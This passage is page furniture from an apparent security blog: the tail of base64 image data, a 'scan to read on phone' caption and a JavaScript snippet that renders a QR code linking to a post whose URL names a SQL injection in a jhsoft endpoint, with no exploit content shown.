FaKnNS6jNMdqz0pNTyfFZ9nvkr/WzWtpDevPhrbuCwkLOtRfvq8dIz1qx/zIzP5kctzzM9nmWmY/dnn+Sek5vv6HvMdey+XBznHRZiaOFrbuDbCxm3m2d/G3k+Kz89Vzn9KxzfYVZN/lW0v6Nz/D2IPSc333nn5oLfXkiGrPq5G/jxhfipET2q/NGnI9mrnP2i+aBa5pyVvmhGnhkp9Tyn5DNMZqxZTt2sfMQfX8g4fD1//QYOC/HT0vFqtFvvfV2X93nq9nduXl1uPtg9M6K+2PXMSKmL5kX1ZFMzrv4VPCzkK80r+/M3sC3E7V/h7Aj5pKS6Hy3lXH25qP5VtD+Y96ScES0V7azMicmOpS72GV23V11Ut19d1A9uC9Fc+NobWAt57f0f3v4vAAAA//919BPWAAAABklEQVQDAAZ3erml2tAzAAAAAElFTkSuQmCC)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-AjaxForDepartmentCollect-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 